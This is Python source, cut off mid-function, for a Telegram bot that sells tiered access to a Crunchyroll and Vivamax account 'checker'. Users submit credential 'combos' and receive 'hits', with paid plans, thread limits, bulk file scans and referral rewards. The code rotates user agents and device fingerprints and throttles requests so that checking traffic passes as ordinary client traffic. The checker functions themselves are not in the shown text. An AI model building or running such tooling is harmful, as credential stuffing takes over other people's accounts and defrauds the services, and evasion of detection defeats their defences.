from fastapi import FastAPI, Request
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
import os
import time
import string
import random
import uuid
import requests
import re
import random
import threading
import concurrent.futures
from datetime import datetime, date
import asyncio
from functools import partial
from contextlib import asynccontextmanager
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CallbackQueryHandler
from supabase import create_client, Client
from datetime import datetime, date, timedelta, timezone
from regions import REGION_HINTS

# ============= TIMEZONE CONFIG =============
PH_TZ = timezone(timedelta(hours=8))

# ============= CONFIGURATION =============
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 7399488750))
CHANNEL_USERNAME = "@caysredirect"

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_ANON_KEY")

TIMEOUT = 30

# ============= API MODES CONFIG (dynamic like the Netflix screenshot) =============
MODES = {
    "Crunchyroll": {
        "display": "Crunchyroll Mode",
        "icon": "🍥",
        "color": "🍥",
        "features": [
            "Extracts account plan & status",
            "Detects Active Subscription",
            "Shows Email Verification",
            "Detects Free Trial",
            "Saves detailed results in TXT files"
        ]
    },
    "Vivamax": {
        "display": "Vivamax Mode",
        "icon": "📺",
        "color": "📺",
        "features": [
            "Checks Vivamax PH streaming accounts",
            "Detects subscription status",
            "Shows account details",
            "Philippine streaming service",
            "Saves detailed results in TXT files"
        ]
    },
}

# ============= DAILY REWARD TIMER HELPER (Fixed - uses UTC) =============
def is_daily_reward_active(stats: dict) -> bool:
    """Returns True if the 24-hour reward timer is still active"""
    last_claimed = stats.get('daily_reward_last_claimed')
    if not last_claimed:
        return False
    
    try:
        if isinstance(last_claimed, str):
            # Remove timezone info and treat as UTC
            if 'Z' in last_claimed or '+' in last_claimed:
                last_claimed = last_claimed.split('+')[0].split('Z')[0]
            last_claimed = datetime.fromisoformat(last_claimed)
        
        now = datetime.utcnow()
        return (now - last_claimed).total_seconds() < 24 * 3600
    except:
        return False

def clean_expired_daily_reward(stats: dict):
    """Automatically clean up expired rewards so Stats/Rewards menu shows correct values"""
    if is_daily_reward_active(stats):
        return stats
    
    user_id = stats.get('user_id')
    if stats.get('daily_reward_lines', 0) > 0 or stats.get('daily_reward_claimed', False):
        update_user_stats(user_id, {
            "daily_reward_lines": 0,
            "daily_reward_claimed": False
        })
        stats['daily_reward_lines'] = 0
        stats['daily_reward_claimed'] = False
    return stats

def get_remaining_reward_time(stats: dict) -> str:
    """Returns countdown like '23:45:12' or 'Ready to Claim!'"""
    last_claimed = stats.get('daily_reward_last_claimed')
    if not last_claimed:
        return "🟢 <b>Ready to Claim!</b>"
    
    try:
        if isinstance(last_claimed, str):
            if 'Z' in last_claimed or '+' in last_claimed:
                last_claimed = last_claimed.split('+')[0].split('Z')[0]
            last_claimed = datetime.fromisoformat(last_claimed)
        
        now = datetime.utcnow()
        remaining = last_claimed + timedelta(hours=24) - now
        
        if remaining.total_seconds() <= 0:
            return "🟢 <b>Ready to Claim!</b>"
        
        hours, remainder = divmod(int(remaining.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"⏳ <code>{hours:02d}:{minutes:02d}:{seconds:02d}</code>"
    except:
        return "🟢 <b>Ready to Claim!</b>"

def generate_referral_code(user_id: int) -> str:
    """Auto-generate nice referral code like CAY73994"""
    prefix = "CAY"
    suffix = str(user_id % 100000).zfill(5)  # last 5 digits
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=3))
    return f"{prefix}{suffix}{random_part}"[:12]

def get_referral_bonus_per_referral(plan: str) -> int:
    """Referral bonus per referral — hard to earn version"""
    plan = plan.upper()
    if plan == "VIP" or plan == "YEARLY":
        return 30
    elif plan == "BASIC":
        return 12
    else:  # FREE
        return 3

# ============= GLOBAL MODE DISPLAY HELPER (clean & future-proof) =============
def get_mode_display(mode_key: str = None) -> str:
    """Returns formatted mode like '🍥 Crunchyroll Mode' with icon.
    Works for any mode you add to the MODES dict."""
    if not mode_key or mode_key not in MODES:
        mode_key = "Crunchyroll"
    
    mode_info = MODES[mode_key]
    return f"{mode_info['icon']} {mode_info['display']}"

# ============= MODE DISPATCHER =============
def get_checker_function(api_mode: str, user_id: int = None):
    """Returns the correct checker function + blocks normal users from Vivamax"""
    if user_id and user_id != ADMIN_ID and api_mode == "Vivamax":
        api_mode = "Crunchyroll"   # Force fallback
    
    checkers = {
        "Crunchyroll": check_crunchyroll,
        "Vivamax": check_vivamax,
    }
    return checkers.get(api_mode, check_crunchyroll)

# ============= PLAN CONFIG =============
PLAN_CONFIG = {
    "FREE": {
        "display_name": "FREE",
        "daily_limit": 15,
        "max_threads": 8,
        "multi_scan_max_files": 0,
        "queue_waiting": True
    },
    "BASIC": {
        "display_name": "BASIC PLAN (WEEKLY)",
        "daily_limit": 100,
        "max_threads": 25,
        "multi_scan_max_files": 3,
        "queue_waiting": False
    },
    "VIP": {
        "display_name": "VIP PLAN (MONTHLY)",
        "daily_limit": None,          # Unlimited
        "max_threads": 40,
        "multi_scan_max_files": 5,
        "queue_waiting": False
    },
    "YEARLY": {
        "display_name": "YEARLY VIP",
        "daily_limit": None,          # Unlimited
        "max_threads": 40,
        "multi_scan_max_files": 5,
        "queue_waiting": False
    }
}

# ============= PLAN DEFAULTS FOR /setplan COMMAND =============
PLAN_DEFAULTS = {
    "FREE": {
        "plan": "FREE",
        "base_plan_limit": 15,
        "threads": 8,
        "expires": "N/A"
    },
    "BASIC": {
        "plan": "BASIC",
        "base_plan_limit": 100,
        "threads": 25   ,
        "expires": (datetime.now() + timedelta(days=7)).strftime("%Y-%m-%d")
    },
    "VIP": {
        "plan": "VIP",
        "base_plan_limit": 999999,   # practically unlimited
        "threads": 40,
        "expires": (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d")
    },
    "YEARLY": {
        "plan": "YEARLY",
        "base_plan_limit": 999999,
        "threads": 40,
        "expires": (datetime.now() + timedelta(days=365)).strftime("%Y-%m-%d")
    }
}

class RateLimiter:
    """Best proxyless rate limiter - controls total requests per second"""
    def __init__(self, max_rps: int = 35):
        self.max_rps = max_rps
        self.lock = threading.Lock()
        self.tokens = 0
        self.last_refill = time.time()

    def acquire(self):
        """Wait until we can send the next request"""
        while True:
            with self.lock:
                now = time.time()
                if now - self.last_refill >= 1.0:
                    self.tokens = self.max_rps
                    self.last_refill = now
                if self.tokens > 0:
                    self.tokens -= 1
                    return
            time.sleep(0.008)

# ============= IMPROVED UA + DEVICE ROTATION (Point 2) =============
def generate_random_user_agent():
    """Much better and more realistic UAs (including official Crunchyroll app)"""
    user_agents = [
        "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
        "Crunchyroll/3.75.0 Android/13 okhttp/4.12.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "Dalvik/2.1.0 (Linux; U; Android 14; SM-S918B Build/UP1A.231005.007)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    ]
    return random.choice(user_agents)

def generate_random_device_info():
    """Better device fingerprinting"""
    device_id = str(uuid.uuid4())
    return device_id, "SamsungTV", "TV"   # You can expand this list later if you want

# ============= DAYS REMAINING HELPER =============
def get_days_remaining(expires_str: str) -> str:
    """Returns nice countdown text for dashboard and stats"""
    if not expires_str or expires_str.upper() == "N/A":
        return "♾️"  # FREE plan or no expiry
    
    try:
        # Handle both "2026-06-04" and "2026-06-04T..." formats
        date_part = expires_str.split('T')[0]
        expires_date = datetime.strptime(date_part, "%Y-%m-%d").date()
        today = date.today()
        
        delta = (expires_date - today).days
        
        if delta < 0:
            return "❌ Expired"
        elif delta == 0:
            return "Expires today"
        elif delta == 1:
            return "1 day left"
        else:
            return f"{delta} days left"
            
    except Exception:
        # Fallback if date format is weird
        return expires_str

def get_plan_limits(stats: dict):
    plan_key = stats.get("plan", "FREE").upper()
    config = PLAN_CONFIG.get(plan_key, PLAN_CONFIG["FREE"])
    
    base_limit = config["daily_limit"]
    
    daily_reward_lines = stats.get("daily_reward_lines", 0)
    if not is_daily_reward_active(stats):
        daily_reward_lines = 0
    
    referral_bonus_per = get_referral_bonus_per_referral(stats.get("plan", "FREE"))
    total_referral_bonus = stats.get("referrals", 0) * referral_bonus_per
    
    bonus_lines = daily_reward_lines + total_referral_bonus
    
    if base_limit is None:  # VIP & YEARLY = unlimited
        daily_limit = None
        remaining_text = "♾️"
        base_limit_text = "♾️"
    else:
        daily_limit = base_limit + bonus_lines
        today_used = stats.get("today_scans", 0)
        remaining = max(0, daily_limit - today_used)
        remaining_text = f"{remaining}/{daily_limit}"
        base_limit_text = f"{base_limit:,}"
    
    return {
        "display_name": config["display_name"],
        "daily_limit": daily_limit,
        "max_threads": config["max_threads"],
        "multi_scan_max_files": config["multi_scan_max_files"],
        "queue_waiting": config["queue_waiting"],
        "remaining_text": remaining_text,
        "current_threads": stats.get("threads", 10),
        "base_limit_text": base_limit_text
    }

# ============= SUPABASE CLIENT =============
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# ============= OWNER RESTRICTION =============
def is_owner(update: Update):
    return update.effective_user and update.effective_user.id == ADMIN_ID

# ============= SIMPLE CHANNEL JOIN CHECK (EASY WAY) =============
async def check_subscription(update: Update, context: CallbackContext) -> bool:
    """Returns True if user is in @caysredirect. Owner always allowed."""
    if is_owner(update):
        return True
    
    user = update.effective_user
    if not user:
        return False

    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user.id)
        # These statuses = joined
        return member.status in ["member", "administrator", "creator", "restricted"]
    except:
        return False
    
# ============= VERIFICATION BUTTON MESSAGE =============
async def send_join_channel_message(update: Update, context: CallbackContext):
    """Shows clean message with Join button + Verify button"""
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.strip('@')}")],
        [InlineKeyboardButton("✅ I've Joined - Verify", callback_data="verify_join")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = f"""
<b>🚫 Access Restricted</b>
━━━━━━━━━━━━━━━━━━━━━━━━
You must be a member of our channel to use the bot.

📢 <a href="https://t.me/{CHANNEL_USERNAME.strip('@')}">{CHANNEL_USERNAME}</a>

After joining, tap the button below 👇
    """.strip()

    if update.callback_query:
        await update.callback_query.edit_message_text(
            text=text,
            parse_mode='HTML',
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    else:
        await update.message.reply_text(
            text=text,
            parse_mode='HTML',
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )

# ============= BLOCKING RUNNER =============
async def run_blocking(func, *args, **kwargs):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, partial(func, *args, **kwargs))

# ============= FASTAPI LIFESPAN =============
@asynccontextmanager
async def lifespan(app: FastAPI):
    global tg_app
    await tg_app.initialize()
    await tg_app.start()
    
    webhook_url = os.getenv("WEBHOOK_URL")
    if webhook_url:
        await tg_app.bot.set_webhook(
            url=webhook_url,
            allowed_updates=["message", "edited_message", "channel_post", "callback_query"]
        )
        print(f"✅ Webhook set → {webhook_url}")
    else:
        print("⚠️ WEBHOOK_URL env var is missing!")

    print("🚀 Bot started on Vercel")
    yield

    await tg_app.stop()
    await tg_app.shutdown()

# ============= FASTAPI + TG APP =============
app = FastAPI(lifespan=lifespan)
tg_app = Application.builder().token(BOT_TOKEN).build()

def get_user_stats(user_id: int):
    response = supabase.table("user_stats").select("*").eq("user_id", user_id).execute()
    if response.data:
        stats = response.data[0]
        stats = clean_expired_daily_reward(stats)
        
        # Auto-generate referral code if missing (for existing users)
        if not stats.get('referral_code'):
            new_code = generate_referral_code(user_id)  # ← was ADMIN_ID
            update_user_stats(user_id, {"referral_code": new_code})
            stats['referral_code'] = new_code
        
        # Auto update last active
        update_user_stats(user_id, {"last_active": datetime.now().isoformat()})
        return stats
    
    # First time user - create row with referral code
    default = {
        "user_id": user_id,
        "username": None,
        "first_name": None,
        "registered": str(date.today()),
        "last_active": datetime.now().isoformat(),
        "plan": "FREE",
        "expires": "N/A",
        "threads": 8,
        "api_mode": "Crunchyroll",
        "total_scans": 0,
        "total_hits": 0,
        "total_free": 0,
        "total_combo_files": 0,
        "today_date": str(datetime.now(PH_TZ).date()),
        "today_scans": 0,
        "today_files": 0,
        "referrals": 0,
        "referral_code": generate_referral_code(user_id),
        "referred_by": None,
        "daily_reward_claimed": False,
        "daily_reward_last_claimed": None,
        "daily_reward_lines": 0,
        "referral_bonus_lines": 0,
        "base_plan_limit": 15,
        "is_banned": False,
        "created_at": datetime.now().isoformat(),
        "updated_at": datetime.now().isoformat()
    }
    supabase.table("user_stats").insert(default).execute()
    return default

# ============= TELEGRAM BOT HANDLERS =============
def update_user_stats(user_id: int, data: dict):
    data["updated_at"] = datetime.now().isoformat()
    supabase.table("user_stats").update(data).eq("user_id", user_id).execute()

def reset_daily_if_needed(stats: dict, user_id: int):
    """Automatically reset daily scans AND daily files at 00:00 Philippine Time"""
    today_ph = datetime.now(PH_TZ).date()
    today_str = str(today_ph)
    
    if stats.get("today_date") != today_str:
        update_user_stats(user_id, {
            "today_scans": 0,
            "today_files": 0,
            "today_date": today_str
        })
        return True
    return False

def update_user_stats_general(user_id: int, data: dict):
    """Update any user (used by admin commands)"""
    data["updated_at"] = datetime.now().isoformat()
    response = supabase.table("user_stats").update(data).eq("user_id", user_id).execute()
    return len(response.data) > 0  # True if row was updated

async def show_referrals_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    
    # Auto-generate referral code if missing
    if not stats.get('referral_code'):
        new_code = generate_referral_code(user_id)
        update_user_stats(user_id, {"referral_code": new_code})
        stats['referral_code'] = new_code
    
    referral_count = stats.get('referrals', 0)
    bonus_per = get_referral_bonus_per_referral(stats.get('plan', 'FREE'))
    total_bonus = referral_count * bonus_per
    
    bot_username = "clydecrunchybot"   # ← Change to your real bot username
    referral_link = f"https://t.me/{bot_username}?start={stats['referral_code']}"
    
    text = f"""
🔗 <b>My Referrals</b>
━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Your Statistics:</b>
✅ Referral Count: <b>{referral_count}</b>
📈 Your Daily Limit: <b>{limits['remaining_text']}</b>
💰 Total Bonus: <b>+{total_bonus} lines</b>
━━━━━━━━━━━━━━━━━━━━━━━
🎁 <b>Earn +{bonus_per} lines for each referral!</b>
━━━━━━━━━━━━━━━━━━━━━━━
🔗 <b>Your Referral Link:</b>
{referral_link}
━━━━━━━━━━━━━━━━━━━━━━━
<i>📤 Share this link with your friends!</i>
Your daily limit increases by {bonus_per} lines for each person who registers using your link.

💡 <b>Example:</b>
• 0 referrals = {limits['base_limit_text']} lines/day
• 5 referrals = +{5*bonus_per} lines/day
• 10 referrals = +{10*bonus_per} lines/day
━━━━━━━━━━━━━━━━━━━━━━━
    """.strip()

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text,
        parse_mode='HTML',
        reply_markup=reply_markup,
        disable_web_page_preview=False
    )

async def show_support_menu(query, context):
    context.user_data['in_main_menu'] = False
    """Replicates the exact Support & Contact page with native preview card"""
    
    text = """📞 <b>Support & Contact</b>
━━━━━━━━━━━━━━━━━━━━━━━
<i>Need help or want to upgrade?</i>

— Contact: <a href="https://t.me/caydigitals">@caydigitals</a>
━━━━━━━━━━━━━━━━━━━━━━━
""".strip()

    # Inline keyboard (Back button at the bottom, exactly like the screenshot)
    keyboard = [
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text=text,
        parse_mode='HTML',
        reply_markup=reply_markup
        # ← DO NOT add disable_web_page_preview=True (or False)
        # Just leave it out — default is False, which enables the preview
    )

async def show_rewards_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    stats = clean_expired_daily_reward(stats)
    is_active = is_daily_reward_active(stats)
    
    if is_active:
        claim_button_text = "⏳ Reward Active"
    else:
        claim_button_text = "🎁 Claim Daily Reward"

    text = f"""
🎁 <b>Rewards & Gifts Hub</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Claim your daily free lines or redeem premium gift codes provided by the admin.

📊 <b>Possible Rewards:</b>
• <b>FREE:</b> mostly 2-6 lines (very rare up to <tg-spoiler>45</tg-spoiler>)
• <b>BASIC:</b> mostly 12-70 lines (very rare up to <tg-spoiler>160</tg-spoiler>)
• <b>VIP / YEARLY:</b> mostly 50-220 lines (very rare up to <tg-spoiler>600</tg-spoiler>)
━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Your Daily Statistics:</b>
⏰ Next Reward In: <code>{get_remaining_reward_time(stats)}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
    """.strip()

    keyboard = [
        [InlineKeyboardButton(claim_button_text, callback_data="claim_daily_reward")],
        [InlineKeyboardButton("📦 REDEEM GIFT CODE", callback_data="redeem_gift_code")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def claim_daily_reward(query, context):
    """Personal 24-hour reward timer — VERY HARD LOTTERY (0.5% jackpot)"""
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    
    if is_daily_reward_active(stats):
        await query.answer("❌ Your previous reward is still active!", show_alert=True)
        await show_rewards_menu(query, context)
        return
    
    plan = stats.get("plan", "FREE").upper()

    # === VERY HARD LOTTERY (0.5% jackpot) ===
    if plan == "FREE":
        # 94.5% tiny | 5% small | 0.5% jackpot
        rewards = [random.randint(2, 6)] * 189 + [random.randint(8, 15)] * 10 + [random.randint(25, 45)] * 1
    elif plan == "BASIC":
        # 79.5% small | 20% decent | 0.5% big
        rewards = [random.randint(12, 30)] * 159 + [random.randint(35, 70)] * 40 + [random.randint(90, 160)] * 1
    else:  # VIP or YEARLY
        # 69.5% decent | 30% good | 0.5% massive jackpot
        rewards = [random.randint(50, 110)] * 139 + [random.randint(130, 220)] * 60 + [random.randint(300, 600)] * 1

    reward_amount = random.choice(rewards)

    update_user_stats(user_id, {
        "daily_reward_lines": reward_amount,
        "daily_reward_claimed": True,
        "daily_reward_last_claimed": datetime.utcnow().isoformat()
    })
    
    # Special jackpot message
    if reward_amount >= 90:
        await query.answer(f"🎉🎉🎉 JACKPOT!!! +{reward_amount} lines (Valid for 24H)!", show_alert=True)
    else:
        await query.answer(
            f"🎉 You received +{reward_amount} lines (Valid for 24H).",
            show_alert=True
        )
    
    await show_rewards_menu(query, context)

# ============= MEMBERSHIP PLAN MENU (Updated to match PLAN_CONFIG) =============
async def show_membership_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    
    current_plan_text = f"📌 Your Current Plan: <b>{limits['display_name']}</b>"
    
    text = f"""
👑 <b>MEMBERSHIP PLANS</b>
━━━━━━━━━━━━━━━━━━━━━━━
🆓 <b>FREE PLAN</b>
• Daily Limit: <b>15 combos/day</b>
• Max Threads: <b>1-8</b>
• Single checks only (no .txt files)
• <b>Basic Hit Details</b> only
━━━━━━━━━━━━━━━━━━━━━━━
⭐ <b>BASIC PLAN (WEEKLY)</b>
• Duration: <b>7 Days</b>
• Daily Limit: <b>100 combos/day</b>
• Max Threads: <b>1-25</b>
• Multi-Scan: <b>Up to 3 files/day</b>
• <b>Medium Hit Details</b>
• No Queue Waiting
• Price: <b>130 Telegram Stars</b>
━━━━━━━━━━━━━━━━━━━━━━━
👑 <b>VIP PLAN (MONTHLY)</b>
• Duration: <b>30 Days</b>
• Daily Limit: <b>♾️ Unlimited</b>
• Max Threads: <b>1-40</b>
• Multi-Scan: <b>Up to 5 files/day</b>
• <b>Full Rich Hit Details</b>
• No Queue Waiting
• Maximum Speed
• Price: <b>399 Telegram Stars</b>
━━━━━━━━━━━━━━━━━━━━━━━
🌟 <b>YEARLY VIP PLAN</b>
• Duration: <b>365 Days</b>
• Daily Limit: <b>♾️ Unlimited</b>
• Max Threads: <b>1-40</b>
• Multi-Scan: <b>Up to 5 files/day</b>
• <b>Full Rich Hit Details</b> + All VIP Benefits
• No Queue Waiting
• Best Value
• Price: <b>3,200 Telegram Stars</b> (Save ~33%)
━━━━━━━━━━━━━━━━━━━━━━━
{current_plan_text}

⚡ <b>Payment Method</b>
Telegram Stars only (currently accepted)

💳 To Purchase A Membership
Contact: <a href="https://t.me/caydigitals">@caydigitals</a>
    """.strip()

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)

# ============= STATISTICS MENU (Exact match to your screenshot) =============
async def show_statistics_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    stats = clean_expired_daily_reward(stats)

    # Auto reset daily stats if new day (Manila time)
    today_ph = datetime.now(PH_TZ).date()
    if stats["today_date"] != str(today_ph):
        update_user_stats(user_id, {"today_scans": 0, "today_date": str(today_ph)})
        stats = get_user_stats(user_id)
    
    limits = get_plan_limits(stats)

    success_rate = round((stats["total_hits"] / stats["total_scans"] * 100), 2) if stats["total_scans"] > 0 else 0.0

    # File statistics
    max_files = limits.get("multi_scan_max_files", 1)
    today_files_used = stats.get("today_files", 0)
    total_files = stats.get("total_combo_files", 0)

    text = f"""
📊 <b>Your Statistics</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>User ID:</b> <code>{stats['user_id']}</code>
📅 <b>Registered:</b> <code>{stats['registered']}</code>
👑 <b>Plan:</b> <code>{stats['plan']}</code>
📆 <b>Plan Expires In:</b> <code>{get_days_remaining(stats['expires'])}</code>
📡 <b>Mode:</b> <code>{get_mode_display(stats.get('api_mode'))}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
🧵 <b>Threads:</b> <code>{limits['current_threads']}/{limits['max_threads']}</code>
📁 <b>Files Today:</b> <code>{today_files_used}/{max_files}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
📈 <b>General Statistics:</b>
✅ Total Scans: <code>{stats['total_scans']}</code>
📁 Total Files Processed: <code>{total_files}</code>
💎 Total Hits: <code>{stats['total_hits']}</code>
❌ Total Bad: <code>{stats.get('total_free', 0)}</code>
🎯 Success Rate: <code>{success_rate}%</code>
━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Today's Statistics:</b>
📊 Scans Used: <code>{stats['today_scans']}</code>
⏳ Remaining: <code>{limits['remaining_text']}</code>
👥 Referrals: <code>{stats['referrals']}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
🎁 <b>Rewards & Limits Details:</b>
🎟️ Claimed Codes: <code>0</code>
🎁 Daily Reward Claimed Today: <code>{'Yes' if stats['daily_reward_claimed'] else 'No'}</code>
✨ Daily Reward Lines (Active): <code>{stats['daily_reward_lines']}</code> {get_remaining_reward_time(stats) if is_daily_reward_active(stats) else ''}
👥 Referral Bonus Lines: <code>+{stats['referral_bonus_lines']}</code>
📦 Base Plan Limit: <code>{limits['base_limit_text']}</code>
    """.strip()

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)

async def reset_reward_command(update: Update, context: CallbackContext):
    """Admin command to reset ALL daily counters + reward timer"""
    if not is_owner(update):
        await update.message.reply_text("❌ This command is only for the owner.")
        return

    args = context.args
    target_user_id = ADMIN_ID  # default = yourself

    if args:
        try:
            target_user_id = int(args[0])
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid user ID.\n\n"
                "Usage:\n"
                "`/resetreward` → reset yourself\n"
                "`/resetreward 1234567890` → reset specific user",
                parse_mode='HTML'
            )
            return

    # Reset ALL daily-related data
    success = update_user_stats_general(target_user_id, {
        "today_scans": 0,
        "today_files": 0,
        "daily_reward_lines": 0,
        "daily_reward_claimed": False,
        "daily_reward_last_claimed": None
    })

    if success:
        await update.message.reply_text(
            f"✅ <b>All daily limits have been reset</b> for user <code>{target_user_id}</code>.\n\n"
            f"• Daily Scans → 0\n"
            f"• Daily Files → 0\n"
            f"• Daily Reward → Ready to claim again",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(f"❌ User {target_user_id} not found or never used the bot.")
async def set_plan_command(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ This command is only for the owner.")
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "📋 <b>Usage:</b>\n\n"
            "<code>/setplan VIP</code> → update yourself\n"
            "<code>/setplan 1234567890 YEARLY</code> → update by user ID\n\n"
            "Available plans: FREE, BASIC, VIP, YEARLY",
            parse_mode='HTML'
        )
        return

    # Determine target and plan
    if len(args) == 1:
        target_user_id = ADMIN_ID
        new_plan = args[0].strip().upper()
    elif len(args) == 2:
        target = args[0].strip()
        new_plan = args[1].strip().upper()

        if target.startswith('@'):
            username = target[1:]
            response = supabase.table("user_stats").select("user_id").eq("username", username).execute()
            if not response.data:
                await update.message.reply_text(f"❌ User with username @{username} not found.")
                return
            target_user_id = response.data[0]["user_id"]
        else:
            try:
                target_user_id = int(target)
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID or username format.")
                return
    else:
        await update.message.reply_text("❌ Wrong usage. Check /setplan for help.")
        return

    if new_plan not in ["FREE", "BASIC", "VIP", "YEARLY"]:
        await update.message.reply_text("❌ Invalid plan! Use: FREE, BASIC, or VIP")
        return

    # ←←← FIXED: Always calculate fresh expiry date here
    if new_plan == "FREE":
        expires = "N/A"
    elif new_plan == "BASIC":
        expires = (datetime.now() + timedelta(days=7)).strftime("%Y-%m-%d")
    elif new_plan == "VIP":
        expires = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d")
    elif new_plan == "YEARLY":
        expires = (datetime.now() + timedelta(days=365)).strftime("%Y-%m-%d")

    defaults = PLAN_DEFAULTS[new_plan]

    update_data = {
        "plan": defaults["plan"],
        "base_plan_limit": defaults["base_plan_limit"],
        "threads": defaults["threads"],
        "expires": expires,                    # ← Fresh date every time
        "daily_reward_lines": 0,
        "referral_bonus_lines": 0
    }

    success = update_user_stats_general(target_user_id, update_data)

    if success:
        await update.message.reply_text(
            f"✅ <b>Plan updated successfully!</b>\n\n"
            f"👤 Target User: <code>{target_user_id}</code>\n"
            f"📌 New Plan: <b>{new_plan}</b>\n"
            f"🧵 Threads: <b>{defaults['threads']}</b>\n"
            f"📆 Expires: <b>{expires}</b>\n\n"
            f"Changes are live immediately.",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text("❌ Failed to update user. Make sure the user has used the bot before.")

async def show_settings_menu(query, context):
    context.user_data['in_main_menu'] = False
    """Replicates the exact Settings Menu"""
    # ←←← IMPORTANT: Clear waiting state when returning from Set Threads
    if 'waiting_for_threads' in context.user_data:
        context.user_data['waiting_for_threads'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    
    settings_text = f"""
⚙️ <b>Settings Menu</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Configure your bot preferences below:

🧵 <b>Threads</b>: Control scan speed
Current: <code>{limits['current_threads']} threads</code> (Max: {limits['max_threads']})

📡 <b>API Mode</b>: Select scanning method
Current: <code>{get_mode_display(stats.get('api_mode'))}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
<i>Click a button to configure:</i>
    """.strip()
    
    keyboard = [
        [
            InlineKeyboardButton("🧵 Set Threads", callback_data="set_threads"),
            InlineKeyboardButton("📡 API Mode", callback_data="set_api_mode"),
        ],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        settings_text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def handle_set_threads(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    plan = limits["display_name"]
    max_t = limits["max_threads"]
    
    # New updated limits based on your current PLAN_CONFIG
    text = f"""
🧵 <b>Set Thread Count</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Limits by plan:
🆓 FREE: <b>1-8</b>
⭐ BASIC: <b>1-25</b>
👑 VIP / YEARLY: <b>1-40</b>

Your plan <b>{plan}</b> allows <b>1-{max_t}</b> threads.

Current threads: <b>{limits['current_threads']}</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Send a number between 1 and {max_t} to set your thread count.
    """.strip()
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_settings")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)
    context.user_data['waiting_for_threads'] = True

async def show_api_mode_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    current_mode = stats.get("api_mode", "Crunchyroll")
    
    mode_info = MODES.get(current_mode, MODES["Crunchyroll"])
    
    # Build feature list
    features_text = "\n".join([f"✅ {feature}" for feature in mode_info["features"]])
    
    text = f"""
📡 <b>API Mode Selection</b>
